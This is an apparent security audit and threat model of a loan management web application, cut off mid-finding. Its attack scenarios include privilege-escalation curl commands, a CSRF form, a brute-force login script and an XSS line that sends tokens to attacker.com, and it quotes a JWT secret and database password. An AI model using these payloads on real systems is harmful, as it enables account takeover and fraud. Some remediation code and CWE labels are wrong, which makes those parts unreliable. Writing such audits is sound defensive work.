# PDM Loan Management System - Security Threat Model & Audit Report

**Application:** PDM Loan Management System
**Technology Stack:** Spring Boot 3.3.4 (Java 21) + Next.js 16 + MySQL
**Assessment Date:** 2025-11-26
**Assessor:** Security Threat Modeling Analysis

---

## Executive Summary

### Overall Security Rating: **C+ (Fair)**

The PDM loan management system demonstrates a moderate security posture with several critical and high-severity vulnerabilities requiring immediate remediation. While the application implements foundational security controls (JWT authentication, rate limiting, password complexity), it suffers from significant security gaps in authorization, CSRF protection, token storage, audit logging, and information disclosure.

### Critical Findings Summary
- **5 Critical Severity Issues**
- **8 High Severity Issues**
- **12 Medium Severity Issues**
- **7 Low Severity Issues**

### Top 5 Most Critical Risks
1. **Missing Authorization Controls (CRITICAL)** - No role-based access control enforcement on sensitive endpoints
2. **JWT Token Storage in localStorage (CRITICAL)** - Vulnerable to XSS attacks
3. **CSRF Protection Disabled (CRITICAL)** - All state-changing operations vulnerable to CSRF
4. **Broken Access Control on Financial Operations (CRITICAL)** - Users can access/modify other users' data
5. **Sensitive Debug Information Exposure (HIGH)** - Passwords and tokens logged to console

---

## STRIDE Threat Analysis

### 1. Spoofing Identity (Authentication Threats)

#### CRITICAL - C-01: Missing Authorization Enforcement
**STRIDE Category:** Spoofing
**Severity:** CRITICAL
**CWE:** CWE-285 (Improper Authorization), CWE-639 (Authorization Bypass Through User-Controlled Key)

**Location:**
- `/Users/it/Documents/GitHub/Ollama-fastapi/PDM_Project/pdm-backend/src/main/java/com/loanweb/controller/UserController.java`
- `/Users/it/Documents/GitHub/Ollama-fastapi/PDM_Project/pdm-backend/src/main/java/com/loanweb/controller/LoanController.java`
- `/Users/it/Documents/GitHub/Ollama-fastapi/PDM_Project/pdm-backend/src/main/java/com/loanweb/controller/WalletController.java`

**Vulnerability:**
Controllers lack role-based authorization checks. Any authenticated user can:
- Access all users' data via `/users/{id}` endpoint
- View/modify any user's loans via `/loans/user/{userId}`
- Deposit/withdraw from any wallet via `/wallets/{id}/deposit`
- Delete any user account via `/users/{id}` (DELETE)

**Attack Scenario:**
```bash
# Attacker authenticates as regular user (ID 100)
# Can access admin user data
curl -H "Authorization: Bearer <user-token>" \
  http://localhost:8080/api/users/1

# Can withdraw from another user's wallet
curl -X POST -H "Authorization: Bearer <user-token>" \
  -H "Content-Type: application/json" \
  -d '{"amount": 10000}' \
  http://localhost:8080/api/wallets/5/withdraw
```

**Impact:** Complete authorization bypass, unauthorized access to PII, financial fraud

**Remediation:**
```java
// Add method-level authorization
@PreAuthorize("hasRole('ADMIN') or @userSecurity.isOwner(#id)")
@GetMapping("/{id}")
public ResponseEntity<?> getUserById(@PathVariable Long id) {
    // Implementation
}

// Create custom security service
@Service
public class UserSecurityService {
    public boolean isOwner(Long userId) {
        Authentication auth = SecurityContextHolder.getContext().getAuthentication();
        User currentUser = customUserDetailsService.loadUserEntityByUsername(auth.getName());
        return currentUser.getId().equals(userId);
    }
}
```

---

#### HIGH - H-01: JWT Secret Key Weak Entropy Validation
**Severity:** HIGH
**CWE:** CWE-326 (Inadequate Encryption Strength)

**Location:**
- `/Users/it/Documents/GitHub/Ollama-fastapi/PDM_Project/pdm-backend/src/main/java/com/loanweb/config/JwtTokenProvider.java:24`

**Vulnerability:**
```java
private SecretKey getSigningKey() {
    byte[] keyBytes = jwtSecret.getBytes(StandardCharsets.UTF_8);
    return Keys.hmacShaKeyFor(keyBytes);
}
```

No validation that JWT secret meets minimum entropy requirements. While the current secret in `.env` appears strong (base64, 86 chars), the example `.env.example` contains a weak placeholder that could be deployed.

**Impact:** JWT tokens could be brute-forced if weak secret is used

**Remediation:**
```java
@PostConstruct
public void validateSecretKey() {
    if (jwtSecret == null || jwtSecret.length() < 64) {
        throw new IllegalStateException(
            "JWT_SECRET must be at least 64 characters for HMAC-SHA256"
        );
    }
    // Check if secret is still the default/example value
    if (jwtSecret.contains("CHANGE-THIS-TO-A-SECURE")) {
        throw new IllegalStateException(
            "JWT_SECRET has not been changed from default value"
        );
    }
}
```

---

#### MEDIUM - M-01: Account Lockout Bypass via In-Memory Storage
**Severity:** MEDIUM
**CWE:** CWE-307 (Improper Restriction of Excessive Authentication Attempts)

**Location:**
- `/Users/it/Documents/GitHub/Ollama-fastapi/PDM_Project/pdm-backend/src/main/java/com/loanweb/service/AccountLockoutService.java:18`

**Vulnerability:**
```java
private final Map<String, LoginAttemptInfo> loginAttempts = new ConcurrentHashMap<>();
```

Account lockout data stored in memory - does not persist across application restarts. Attacker can bypass lockout by triggering application restart or waiting for deployment.

**Impact:** Brute force attacks can continue after service restart

**Remediation:**
- Store failed attempts in database or Redis with TTL
- Implement distributed lockout for multi-instance deployments
- Consider IP-based rate limiting in addition to account-based

---

### 2. Tampering (Data Integrity Threats)

#### CRITICAL - C-02: CSRF Protection Disabled
**Severity:** CRITICAL
**CWE:** CWE-352 (Cross-Site Request Forgery)

**Location:**
- `/Users/it/Documents/GitHub/Ollama-fastapi/PDM_Project/pdm-backend/src/main/java/com/loanweb/config/SecurityConfig.java:44`

**Vulnerability:**
```java
.csrf(csrf -> csrf.disable()) // Disabled for stateless JWT API - must be first
```

CSRF protection completely disabled. While JWT-based APIs are typically stateless, the frontend stores tokens in cookies, making it vulnerable to CSRF when browser automatically sends cookies.

**Attack Scenario:**
```html
<!-- Attacker's malicious website -->
<img src="http://localhost:8080/api/wallets/5/withdraw"
     style="display:none">
<form id="evil" action="http://localhost:8080/api/loans" method="POST">
  <input name="userId" value="victim-id">
  <input name="amount" value="100000">
</form>
<script>document.getElementById('evil').submit();</script>
```

When victim visits attacker's site while authenticated, their browser sends the JWT cookie, executing unauthorized actions.

**Impact:** Financial fraud, unauthorized transactions, data modification

**Remediation:**
```java
// Option 1: Enable CSRF with cookie-based token for same-site protection
.csrf(csrf -> csrf
    .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
    .csrfTokenRequestHandler(new SpaCsrfTokenRequestHandler())
)

// Option 2: Use SameSite cookie attribute (already partially done)
// Update AuthContext.tsx to use SameSite=Strict
document.cookie = `token=${data.token}; path=/; max-age=${60*60*24}; SameSite=Strict; Secure`;

// Option 3: Custom anti-CSRF header validation
@Component
public class CsrfHeaderFilter implements Filter {
    public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain) {
        HttpServletRequest request = (HttpServletRequest) req;
        String csrfHeader = request.getHeader("X-Requested-With");
        if (!"XMLHttpRequest".equals(csrfHeader) && isStateChanging(request)) {
            ((HttpServletResponse) res).sendError(403, "Missing CSRF header");
            return;
        }
        chain.doFilter(req, res);
    }
}
```

---

#### HIGH - H-02: Mass Assignment Vulnerability in User Updates
**Severity:** HIGH
**CWE:** CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object Attributes)

**Location:**
- `/Users/it/Documents/GitHub/Ollama-fastapi/PDM_Project/pdm-backend/src/main/java/com/loanweb/controller/UserController.java:36-56`

**Vulnerability:**
```java
@PutMapping("/{id}")
public ResponseEntity<?> updateUser(@PathVariable Long id, @RequestBody Map<String, Object> updates) {
    if (updates.containsKey("role")) {
        user.setRole(UserRole.valueOf((String) updates.get("role")));
    }
}
```

Accepts arbitrary Map allowing users to modify their own role to ADMIN without authorization checks.

**Attack Scenario:**
```bash
curl -X PUT http://localhost:8080/api/users/100 \
  -H "Authorization: Bearer <user-token>" \
  -H "Content-Type: application/json" \
  -d '{"role": "ADMIN"}'
```

**Impact:** Privilege escalation to administrator

**Remediation:**
```java
// Create specific DTO classes
public class UserUpdateRequest {
    @Size(max = 255)
    private String fullName;

    @Pattern(regexp = "^\\+?[0-9]{10,15}$")
    private String phone;

    // NO role field - role changes require separate admin endpoint
}

@PutMapping("/{id}")
@PreAuthorize("@userSecurity.isOwner(#id)")
public ResponseEntity<?> updateUser(@PathVariable Long id,
                                    @Valid @RequestBody UserUpdateRequest request) {
    // Only update allowed fields
}

// Admin-only role update
@PutMapping("/{id}/role")
@PreAuthorize("hasRole('ADMIN')")
public ResponseEntity<?> updateUserRole(@PathVariable Long id, @RequestBody RoleUpdateRequest request) {
    // Role update logic with audit logging
}
```

---

#### MEDIUM - M-02: SQL Injection Risk via Dynamic BigDecimal Parsing
**Severity:** MEDIUM
**CWE:** CWE-89 (SQL Injection)

**Location:**
- `/Users/it/Documents/GitHub/Ollama-fastapi/PDM_Project/pdm-backend/src/main/java/com/loanweb/controller/LoanController.java:78`
- `/Users/it/Documents/GitHub/Ollama-fastapi/PDM_Project/pdm-backend/src/main/java/com/loanweb/controller/WalletController.java:57,86`

**Vulnerability:**
```java
@PostMapping("/{id}/payment")
public ResponseEntity<Loan> makePayment(@PathVariable Long id, @RequestBody Map<String, Object> request) {
    BigDecimal paymentAmount = new BigDecimal(request.get("amount").toString());
    // ...
}
```

While using parameterized queries (good!), the BigDecimal parsing from unvalidated input could throw exceptions or accept malformed values.

**Impact:** Application DoS via malformed input, potential for numeric overflow attacks

**Remediation:**
```java
// Create validation DTO
public class PaymentRequest {
    @NotNull
    @DecimalMin("0.01")
    @DecimalMax("999999.99")
    @Digits(integer = 6, fraction = 2)
    private BigDecimal amount;
}

@PostMapping("/{id}/payment")
public ResponseEntity<Loan> makePayment(@PathVariable Long id,
                                        @Valid @RequestBody PaymentRequest request) {
    Loan loan = loanService.makePayment(id, request.getAmount());
    return ResponseEntity.ok(loan);
}
```

---

### 3. Repudiation (Audit & Logging Threats)

#### HIGH - H-03: Missing Audit Logging for Sensitive Operations
**Severity:** HIGH
**CWE:** CWE-778 (Insufficient Logging)

**Location:**
- All financial transaction endpoints (loans, wallets, payments)
- User role modifications
- Account deletion operations

**Vulnerability:**
No audit trail for:
- Loan approvals/rejections
- Financial transactions (deposits, withdrawals, payments)
- User data modifications
- Authorization failures
- Role privilege escalations

**Impact:**
- Cannot detect or investigate fraud
- No compliance with financial regulations (SOX, PCI-DSS)
- Cannot prove non-repudiation
- Insider threats undetectable

**Remediation:**
```java
@Service
public class AuditLogService {
    private final AuditLogRepository auditLogRepository;

    public void logFinancialTransaction(String action, User actor,
                                       BigDecimal amount, String entityType,
                                       Long entityId, String outcome) {
        AuditLog log = AuditLog.builder()
            .timestamp(LocalDateTime.now())
            .action(action)
            .actorId(actor.getId())
            .actorEmail(actor.getEmail())
            .actorRole(actor.getRole())
            .entityType(entityType)
            .entityId(entityId)
            .amount(amount)
            .outcome(outcome)
            .ipAddress(getCurrentRequestIp())
            .userAgent(getCurrentRequestUserAgent())
            .build();
        auditLogRepository.save(log);
    }
}

// Use AOP for automatic audit logging
@Aspect
@Component
public class AuditAspect {
    @Around("@annotation(Audited)")
    public Object auditMethod(ProceedingJoinPoint joinPoint) throws Throwable {
        // Log before and after with outcome
    }
}
```

---

#### MEDIUM - M-03: Token Expiration Not Tracked for Revocation
**Severity:** MEDIUM
**CWE:** CWE-613 (Insufficient Session Expiration)

**Vulnerability:**
JWT tokens cannot be revoked before expiration (24 hours). No token blacklist or session tracking exists.

**Attack Scenario:**
1. User's device is compromised, token stolen
2. User reports compromise and changes password
3. Attacker still has valid token for 24 hours
4. No mechanism to invalidate stolen token

**Remediation:**
```java
// Implement token blacklist with Redis
@Service
public class TokenBlacklistService {
    private final RedisTemplate<String, String> redisTemplate;

    public void blacklistToken(String token, long expirationSeconds) {
        String tokenHash = DigestUtils.sha256Hex(token);
        redisTemplate.opsForValue().set(
            "blacklist:" + tokenHash,
            "revoked",
            expirationSeconds,
            TimeUnit.SECONDS
        );
    }

    public boolean isBlacklisted(String token) {
        String tokenHash = DigestUtils.sha256Hex(token);
        return redisTemplate.hasKey("blacklist:" + tokenHash);
    }
}

// Add endpoint for token revocation
@PostMapping("/auth/logout")
public ResponseEntity<?> logout(HttpServletRequest request) {
    String token = getJwtFromRequest(request);
    long remainingValidity = tokenProvider.getRemainingValidity(token);
    tokenBlacklistService.blacklistToken(token, remainingValidity);
    return ResponseEntity.ok(Map.of("message", "Logged out successfully"));
}
```

---

### 4. Information Disclosure (Confidentiality Threats)

#### CRITICAL - C-03: Sensitive Data Exposure in Debug Logs
**Severity:** CRITICAL
**CWE:** CWE-532 (Insertion of Sensitive Information into Log File)

**Location:**
- `/Users/it/Documents/GitHub/Ollama-fastapi/PDM_Project/pdm-backend/src/main/java/com/loanweb/config/CustomUserDetailsService.java:37`
- `/Users/it/Documents/GitHub/Ollama-fastapi/PDM_Project/pdm-backend/src/main/java/com/loanweb/controller/AuthController.java:106`

**Vulnerability:**
```java
// CustomUserDetailsService.java:37
System.out.println("DEBUG loadUserByUsername: email=" + email +
    ", hashPrefix=" + password.substring(0, Math.min(30, password.length())));

// AuthController.java:106
System.out.println("DEBUG login: email=" + request.getEmail() +
    ", passwordLength=" + (request.getPassword() != null ? request.getPassword().length() : 0));
```

BCrypt password hashes and user emails logged to console/files. Logs accessible to operators could enable offline password cracking.

**Impact:**
- Password hash exposure enables offline brute-force attacks
- PII exposure (emails) violates GDPR/privacy regulations
- Logs may be accessible to unauthorized personnel

**Remediation:**
```java
// REMOVE all debug logging statements
// Use proper SLF4J logging with appropriate levels
private static final Logger log = LoggerFactory.getLogger(CustomUserDetailsService.class);

// Only log non-sensitive audit information
log.info("User authentication attempt for email: {}", maskEmail(email));

private String maskEmail(String email) {
    int atIndex = email.indexOf('@');
    if (atIndex > 2) {
        return email.substring(0, 2) + "***" + email.substring(atIndex);
    }
    return "***";
}
```

**IMMEDIATE ACTION REQUIRED:**
```bash
# Remove debug statements from production code
grep -r "System.out.print\|System.err.print" src/main/java --exclude-dir=test
# Delete all existing log files containing sensitive data
rm -f backend.log frontend.log
# Update .gitignore to exclude all log files
echo "*.log" >> .gitignore
```

---

#### HIGH - H-04: Database Credentials Hardcoded in .env File
**Severity:** HIGH
**CWE:** CWE-798 (Use of Hard-coded Credentials)

**Location:**
- `/Users/it/Documents/GitHub/Ollama-fastapi/PDM_Project/pdm-backend/.env`

**Vulnerability:**
```
DB_HOST=127.0.0.1
DB_PORT=3306
DB_NAME=pdm-project
DB_USERNAME=pdm_user
DB_PASSWORD=pdm_password
JWT_SECRET=GwRpwXqxADt18i3UhM8JHlekobrdXAiRwY8LzF2D7WJoKBOSNRHxWQENOHRtkSHsAxqkNVascoKgZOZdfne5Gg==
```

`.env` file committed to version control (visible in git status). Credentials and secrets exposed in repository history.

**Impact:**
- Full database compromise if repository is leaked
- JWT secret exposure allows token forgery
- Credentials may be in git history even if deleted

**Remediation:**
1. **Immediate:**
```bash
# Remove .env from version control
git rm --cached pdm-backend/.env
git commit -m "Remove sensitive .env file from version control"

# Add to .gitignore
echo ".env" >> pdm-backend/.gitignore

# Rotate all secrets immediately
# - Generate new JWT_SECRET
# - Change DB_PASSWORD
# - Update production deployment
```

2. **Long-term:**
```yaml
# Use secrets management service
# AWS Secrets Manager example
spring:
  cloud:
    aws:
      secrets-manager:
        enabled: true
        region: us-east-1

# Or HashiCorp Vault
spring:
  cloud:
    vault:
      token: ${VAULT_TOKEN}
      scheme: https
      host: vault.example.com
```

---

#### MEDIUM - M-04: Passwords Returned in API Responses
**Severity:** MEDIUM
**CWE:** CWE-200 (Exposure of Sensitive Information)

**Location:**
- `/Users/it/Documents/GitHub/Ollama-fastapi/PDM_Project/pdm-backend/src/main/java/com/loanweb/controller/AuthController.java:88,123,149`

**Vulnerability:**
```java
// AuthController.java
savedUser.setPassword(null);  // Manual password removal
user.setPassword(null);       // Inconsistently applied
```

Password removal done manually before each response - error-prone and could be missed in new endpoints.

**Impact:** Password hash exposure in API responses if developer forgets to null password field

**Remediation:**
```java
// Use @JsonIgnore annotation on password field
@Data
@Builder
public class User {
    private Long id;
    private String email;

    @JsonIgnore  // Never serialize password
    private String password;

    private String fullName;
    // ...
}

// Alternative: Use separate DTO for responses
public class UserResponse {
    private Long id;
    private String email;
    private String fullName;
    private String phone;
    private UserRole role;
    private String status;
    // No password field

    public static UserResponse from(User user) {
        return new UserResponse(user);
    }
}
```

---

#### MEDIUM - M-05: CORS Origins Not Validated Dynamically
**Severity:** MEDIUM
**CWE:** CWE-942 (Overly Permissive Cross-domain Whitelist)

**Location:**
- `/Users/it/Documents/GitHub/Ollama-fastapi/PDM_Project/pdm-backend/src/main/java/com/loanweb/config/SecurityConfig.java:65`

**Vulnerability:**
```java
String allowedOriginsStr = System.getenv().getOrDefault(
    "CORS_ALLOWED_ORIGINS", "http://localhost:3000"
);
configuration.setAllowedOrigins(Arrays.asList(allowedOriginsStr.split(",")));
```

CORS origins loaded from environment variable without validation. Could allow wildcard (*) or malicious origins if misconfigured.

**Impact:** Cross-origin attacks if production misconfiguration occurs

**Remediation:**
```java
@Bean
public CorsConfigurationSource corsConfigurationSource() {
    CorsConfiguration configuration = new CorsConfiguration();

    String allowedOriginsStr = System.getenv()
        .getOrDefault("CORS_ALLOWED_ORIGINS", "http://localhost:3000");

    List<String> origins = Arrays.asList(allowedOriginsStr.split(","));

    // Validate origins
    for (String origin : origins) {
        if (origin.equals("*")) {
            throw new IllegalStateException("Wildcard CORS origin not allowed");
        }
        if (!origin.matches("^https?://[a-zA-Z0-9.-]+(:[0-9]+)?$")) {
            throw new IllegalStateException("Invalid CORS origin: " + origin);
        }
    }

    configuration.setAllowedOrigins(origins);
    configuration.setAllowedOrigins(List.of("https")); // Production should be HTTPS only
    // ...
}
```

---

### 5. Denial of Service (Availability Threats)

#### HIGH - H-05: Rate Limiting Insufficient for Brute Force Protection
**Severity:** HIGH
**CWE:** CWE-307 (Improper Restriction of Excessive Authentication Attempts)

**Location:**
- `/Users/it/Documents/GitHub/Ollama-fastapi/PDM_Project/pdm-backend/src/main/java/com/loanweb/config/RateLimitFilter.java:21`

**Vulnerability:**
```java
private static final int MAX_REQUESTS_PER_MINUTE = 100;
```

100 requests per minute allows 6000 password attempts per hour from a single IP. Combined with distributed attack from multiple IPs, this is insufficient for protecting authentication endpoints.

**Attack Scenario:**
```python
# Attacker script - 100 login attempts per minute
import requests
import time

passwords = load_password_list()  # 100 most common passwords
for pwd in passwords:
    requests.post('http://target.com/api/auth/login',
                  json={'email': 'victim@example.com', 'password': pwd})
    time.sleep(0.6)  # 100 requests per minute
```

**Impact:** Account compromise via credential stuffing/brute force

**Remediation:**
```java
// Different rate limits per endpoint type
@Component
public class AdaptiveRateLimitFilter implements Filter {

    private static final Map<String, RateLimitConfig> ENDPOINT_LIMITS = Map.of(
        "/auth/login", new RateLimitConfig(5, 60),      // 5 attempts per minute
        "/auth/register", new RateLimitConfig(3, 300),   // 3 per 5 minutes
        "/loans", new RateLimitConfig(20, 60),           // 20 per minute
        "DEFAULT", new RateLimitConfig(100, 60)          // 100 per minute default
    );

    public void doFilter(ServletRequest request, ServletResponse response,
                        FilterChain chain) {
        HttpServletRequest httpRequest = (HttpServletRequest) request;
        String endpoint = httpRequest.getRequestURI();

        RateLimitConfig config = ENDPOINT_LIMITS.getOrDefault(
            endpoint, ENDPOINT_LIMITS.get("DEFAULT")
        );

        if (isRateLimitExceeded(getClientIP(httpRequest), endpoint, config)) {
            // Return 429 with Retry-After header
        }
        chain.doFilter(request, response);
    }
}
```

---

#### MEDIUM - M-06: No Connection Pool Exhaustion Protection
**Severity:** MEDIUM
**CWE:** CWE-400 (Uncontrolled Resource Consumption)

**Location:**
- `/Users/it/Documents/GitHub/Ollama-fastapi/PDM_Project/pdm-backend/src/main/resources/application.yml:15-21`

**Vulnerability:**
```yaml
hikari:
  maximum-pool-size: 10
  minimum-idle: 2
  connection-timeout: 5000
  leak-detection-threshold: 60000
```

Small connection pool (10 connections) without circuit breaker. Sustained high traffic or database slowdown will exhaust pool and cause cascading failures.

**Impact:** Application DoS under high load or database latency

**Remediation:**
```yaml
# Increase pool size based on load testing
hikari:
  maximum-pool-size: 50  # Increased
  minimum-idle: 10
  connection-timeout: 5000
  validation-timeout: 3000
  leak-detection-threshold: 30000  # Faster leak detection

# Add circuit breaker
resilience4j:
  circuitbreaker:
    instances:
      database:
        sliding-window-size: 100
        failure-rate-threshold: 50
        wait-duration-in-open-state: 10s
        permitted-number-of-calls-in-half-open-state: 10
```

---

#### MEDIUM - M-07: No Request Size Limits
**Severity:** MEDIUM
**CWE:** CWE-770 (Allocation of Resources Without Limits)

**Vulnerability:**
No limits on request body size. Attacker could send multi-GB requests causing memory exhaustion.

**Remediation:**
```yaml
# application.yml
server:
  tomcat:
    max-http-form-post-size: 1MB
    max-swallow-size: 1MB
  max-http-header-size: 8KB

spring:
  servlet:
    multipart:
      max-file-size: 10MB
      max-request-size: 10MB
```

---

### 6. Elevation of Privilege (Authorization Threats)

#### CRITICAL - C-04: No Role-Based Access Control (RBAC) Implementation
**Severity:** CRITICAL
**CWE:** CWE-862 (Missing Authorization)

**Location:**
- All controller endpoints except `/auth/**` and `/health`

**Vulnerability:**
```java
// SecurityConfig.java:47-50
.authorizeHttpRequests(auth -> auth
    .requestMatchers("/auth/**").permitAll()
    .requestMatchers("/health").permitAll()
    .anyRequest().authenticated()  // Only checks authentication, not authorization
)
```

No distinction between user roles (APPLICANT, STAFF, ADMIN, BANKER, UNDERWRITER, VERIFIER). All authenticated users have equal access to all endpoints.

**Attack Scenario:**
```bash
# Regular applicant (role: APPLICANT) can:
# 1. Access admin user list
curl -H "Authorization: Bearer <applicant-token>" \
  http://localhost:8080/api/users

# 2. Approve their own loan application
curl -X PUT -H "Authorization: Bearer <applicant-token>" \
  http://localhost:8080/api/loans/123/approve

# 3. Delete any user account
curl -X DELETE -H "Authorization: Bearer <applicant-token>" \
  http://localhost:8080/api/users/1
```

**Impact:** Complete privilege escalation, unauthorized administrative actions

**Remediation:**
```java
// Enable method security
@Configuration
@EnableMethodSecurity(prePostEnabled = true)
public class SecurityConfig {
    // ...
}

// Add role-based authorization to controllers
@RestController
@RequestMapping("/users")
public class UserController {

    @GetMapping
    @PreAuthorize("hasRole('ADMIN') or hasRole('STAFF')")
    public ResponseEntity<List<User>> getAllUsers() {
        // Only admins and staff can list users
    }

    @GetMapping("/{id}")
    @PreAuthorize("hasRole('ADMIN') or @userSecurity.isOwner(#id)")
    public ResponseEntity<?> getUserById(@PathVariable Long id) {
        // User can view own profile, admins can view any
    }

    @DeleteMapping("/{id}")
    @PreAuthorize("hasRole('ADMIN')")
    public ResponseEntity<?> deleteUser(@PathVariable Long id) {
        // Only admins can delete users
    }
}

@RestController
@RequestMapping("/loans")
public class LoanController {

    @GetMapping("/user/{userId}")
    @PreAuthorize("hasRole('ADMIN') or hasRole('STAFF') or @userSecurity.isOwner(#userId)")
    public ResponseEntity<List<Loan>> getLoansByUserId(@PathVariable Long userId) {
        // User can view own loans, staff/admin can view any
    }

    @PutMapping("/{id}/approve")
    @PreAuthorize("hasRole('UNDERWRITER') or hasRole('ADMIN')")
    public ResponseEntity<Loan> approveLoan(@PathVariable Long id) {
        // Only underwriters and admins can approve loans
    }
}

@RestController
@RequestMapping("/wallets")
public class WalletController {

    @PostMapping("/{id}/withdraw")
    @PreAuthorize("@walletSecurity.canModify(#id)")
    public ResponseEntity<?> withdraw(@PathVariable Long id,
                                     @RequestBody Map<String, Object> request) {
        // Only wallet owner can withdraw
    }
}
```

---

#### CRITICAL - C-05: JWT Token Stored in localStorage (XSS Risk)
**Severity:** CRITICAL
**CWE:** CWE-922 (Insecure Storage of Sensitive Information)

**Location:**
- `/Users/it/Documents/GitHub/Ollama-fastapi/PDM_Project/pdm-frontend/contexts/AuthContext.tsx:87,109`

**Vulnerability:**
```typescript
localStorage.setItem('token', data.token);
document.cookie = `token=${data.token}; path=/; max-age=${60 * 60 * 24}`;
```

JWT token stored in localStorage AND non-HttpOnly cookie. Vulnerable to XSS attacks that can steal authentication tokens.

**Attack Scenario:**
```html
<!-- If any XSS vulnerability exists in the application -->
<script>
  // Attacker's injected script
  fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'));
  // Or via cookie
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

**Impact:** Complete account takeover via XSS, session hijacking

**Remediation:**
```typescript
// REMOVE localStorage usage entirely
// Use HttpOnly, Secure, SameSite cookies ONLY

// Backend: Set cookie in response
@PostMapping("/login")
public ResponseEntity<?> login(@Valid @RequestBody LoginRequest request,
                               HttpServletResponse response) {
    Authentication authentication = authenticationManager.authenticate(
        new UsernamePasswordAuthenticationToken(request.getEmail(), request.getPassword())
    );

    String jwt = tokenProvider.generateToken(authentication);
    User user = customUserDetailsService.loadUserEntityByUsername(request.getEmail());

    // Set HttpOnly cookie
    Cookie cookie = new Cookie("token", jwt);
    cookie.setHttpOnly(true);      // Prevents JavaScript access
    cookie.setSecure(true);        // HTTPS only
    cookie.setPath("/");
    cookie.setMaxAge(24 * 60 * 60); // 24 hours
    cookie.setAttribute("SameSite", "Strict");  // CSRF protection
    response.addCookie(cookie);

    user.setPassword(null);
    return ResponseEntity.ok(new UserResponse(user));  // Don't return token in body
}

// Frontend: Remove localStorage usage
const login = async (email: string, password: string) => {
    const response = await fetch(`${API_URL}/auth/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        credentials: 'include',  // Include cookies in requests
        body: JSON.stringify({ email, password }),
    });

    if (!response.ok) {
        throw new Error('Login failed');
    }

    const data = await response.json();
    setUser(data.user);  // Token is in HttpOnly cookie, not exposed to JS
};

// Update API client to include credentials
async function fetchAPI(endpoint: string, options: RequestInit = {}) {
    const url = `${API_BASE_URL}${endpoint}`;

    const response = await fetch(url, {
        ...options,
        credentials: 'include',  // Send cookies with every request
        headers: {
            'Content-Type': 'application/json',
            'X-Requested-With': 'XMLHttpRequest',  // CSRF protection
            ...options.headers,
        },
    });
    // ...
}
```

---

#### HIGH - H-06: Insecure Password Reset Flow (If Implemented)
**Severity:** HIGH
**CWE:** CWE-640 (Weak Password Recovery Mechanism)

**Vulnerability:**
No password reset functionality currently implemented, but when added, must avoid common pitfalls:
- Password reset tokens sent via GET parameters (logged in browser history)
- Tokens that don't expire
- Tokens not invalidated after use
- No rate limiting on password reset requests

**Remediation (Future Implementation):**
```java
@PostMapping("/auth/forgot-password")
@RateLimited(maxAttempts = 3, windowMinutes = 60)
public ResponseEntity<?> forgotPassword(@RequestBody ForgotPasswordRequest request) {
    User user = userRepository.findByEmail(request.getEmail())
        .orElse(null);

    // Don't reveal if email exists (timing attack prevention)
    if (user != null) {
        String resetToken = secureRandomToken(32);
        String tokenHash = DigestUtils.sha256Hex(resetToken);

        PasswordResetToken token = PasswordResetToken.builder()
            .userId(user.getId())
            .tokenHash(tokenHash)
            .expiresAt(LocalDateTime.now().plusHours(1))  // 1 hour expiry
            .used(false)
            .build();
        passwordResetTokenRepository.save(token);

        // Send email with reset link (HTTPS only)
        emailService.sendPasswordResetEmail(user.getEmail(), resetToken);
    }

    // Always return success to prevent email enumeration
    return ResponseEntity.ok(Map.of("message",
        "If email exists, reset link has been sent"));
}

@PostMapping("/auth/reset-password")
public ResponseEntity<?> resetPassword(@Valid @RequestBody ResetPasswordRequest request) {
    String tokenHash = DigestUtils.sha256Hex(request.getToken());

    PasswordResetToken token = passwordResetTokenRepository.findByTokenHash(tokenHash)
        .orElseThrow(() -> new InvalidTokenException("Invalid or expired token"));

    if (token.isUsed() || token.getExpiresAt().isBefore(LocalDateTime.now())) {
        throw new InvalidTokenException("Invalid or expired token");
    }

    User user = userRepository.findById(token.getUserId())
        .orElseThrow(() -> new UserNotFoundException("User not found"));

    user.setPassword(passwordEncoder.encode(request.getNewPassword()));
    userRepository.save(user);

    // Mark token as used
    token.setUsed(true);
    passwordResetTokenRepository.save(token);

    // Invalidate all existing JWT tokens for this user
    tokenBlacklistService.blacklistAllUserTokens(user.getId());

    // Audit log
    auditLogService.logPasswordReset(user);

    return ResponseEntity.ok(Map.of("message", "Password reset successful"));
}
```

---

## Frontend Security Analysis

### HIGH - H-07: Missing Content Security Policy
**Severity:** HIGH
**CWE:** CWE-1021 (Improper Restriction of Rendered UI Layers)

**Location:**
- `/Users/it/Documents/GitHub/Ollama-fastapi/PDM_Project/pdm-frontend/` (no CSP headers configured)

**Vulnerability:**
Next.js frontend does not set Content-Security-Policy headers, allowing inline scripts and external resource loading.

**Impact:** XSS attacks can execute arbitrary JavaScript

**Remediation:**
```typescript
// next.config.ts
const nextConfig = {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: [
          {
            key: 'Content-Security-Policy',
            value: [
              "default-src 'self'",
              "script-src 'self' 'unsafe-eval' 'unsafe-inline'",  // Next.js requires unsafe-eval
              "style-src 'self' 'unsafe-inline'",
              "img-src 'self' data: https:",
              "font-src 'self' data:",
              "connect-src 'self' http://localhost:8080",
              "frame-ancestors 'none'",
              "base-uri 'self'",
              "form-action 'self'"
            ].join('; ')
          },
          {
            key: 'X-Frame-Options',
            value: 'DENY'
          },
          {
            key: 'X-Content-Type-Options',
            value: 'nosniff'
          },
          {
            key: 'Referrer-Policy',
            value: 'strict-origin-when-cross-origin'
          },
          {
            key: 'Permissions-Policy',
            value: 'camera=(), microphone=(), geolocation=()'
          }
        ]
      }
    ];
  }
};
```

---

### MEDIUM - M-08: No Input Sanitization in Frontend
**Severity:** MEDIUM
**CWE:** CWE-79 (Cross-site Scripting)

**Vulnerability:**
While React provides some XSS protection by default, user inputs are not explicitly sanitized before display.

**Remediation:**
```typescript
// Install DOMPurify
npm install dompurify @types/dompurify

// Create sanitization utility
import DOMPurify from 'dompurify';

export function sanitizeInput(input: string): string {
  return DOMPurify.sanitize(input, {
    ALLOWED_TAGS: [],  // Strip all HTML
    ALLOWED_ATTR: []
  });
}

// Use in components
const UserProfile = ({ user }: { user: User }) => {
  return (
    <div>
      <h1>{sanitizeInput(user.fullName)}</h1>
      <p>{sanitizeInput(user.email)}</p>
    </div>
  );
};
```

---

### MEDIUM - M-09: API URL Hardcoded in Frontend
**Severity:** MEDIUM
**CWE:** CWE-506 (Embedded Malicious Code)

**Location:**
